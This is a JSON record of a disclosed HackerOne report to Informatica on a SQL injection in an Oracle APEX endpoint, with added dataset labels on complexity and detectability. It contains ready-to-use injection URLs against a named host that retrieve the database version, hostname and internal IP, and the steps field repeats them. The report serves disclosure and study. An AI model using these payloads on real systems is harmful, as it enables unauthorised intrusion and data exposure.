{
  "reported_to": "Informatica",
  "reported_by": "e3xpl0it ",
  "title": "[afocusp.informatica.com] Sql injection  afocusp.informatica.com:37777",
  "content": "\nhi !There is another sql injection on host afocusp.informatica.com:37777\nPOC\nversion\nhttp://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version\nhostname of the database server\npsvlxtdapp1.inf\nhttp://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual\nIP address of the database server (local)\n10.1.192.93\nhttp://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual\nPs\nYou need to patch all servers with the url /pls/apex/f? this is old bug in oracle.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1485043500,
  "report_url": "https://hackerone.com/reports/178632",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Access the URL http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version to retrieve the database version."
    ],
    [
      2,
      "Access the URL http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual to retrieve the hostname of the database server."
    ],
    [
      3,
      "Access the URL http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual to retrieve the IP address of the database server."
    ]
  ],
  "vuln_description": "This vulnerability is a SQL injection in the Oracle APEX application hosted at afocusp.informatica.com:37777. The attacker can inject SQL queries via the URL parameter to retrieve sensitive information such as the database version, hostname, and IP address of the database server. The vulnerability exploits the OWA_UTIL.CELLSPRINT function in Oracle APEX, which is a known issue in older versions.",
  "reason": "The vulnerability involves a straightforward SQL injection attack using a known exploit in Oracle APEX. The attack does not require multiple components, complex application states, or novel logic. The steps are simple and the interactions are obvious, making the discovery difficulty low.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "reasoning": "The SQL injection vulnerability described in the report involves injecting payloads directly into URL parameters (e.g., `f?);OWA_UTIL.CELLSPRINT(:1);--=...`). The methodology involves analyzing HTTP requests/responses for injectable parameters during regular navigation and testing them with simple payloads. Since the vulnerable parameter (`/pls/apex/f?`) is part of the URL structure and the payloads used (e.g., `select+*+from+v$version`) are generic SQL queries without requiring custom filter bypasses, they align with the 'simple payloads' definition. Detection is same-channel, as the database response (e.g., version, hostname) is directly reflected in the HTTP response, which fits the methodology's criteria for identifying vulnerabilities through regular navigation and response inspection.",
    "is_simple_injection": true
  },
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability reported involves direct manipulation of database queries through URL parameters, which is not related to authentication or authorization boundaries. The proposed methodologies focus on testing AuthN/AuthZ and IDOR vulnerabilities by manipulating user sessions and resource access, not SQL injection vulnerabilities.",
    "is_detectable": false
  }
}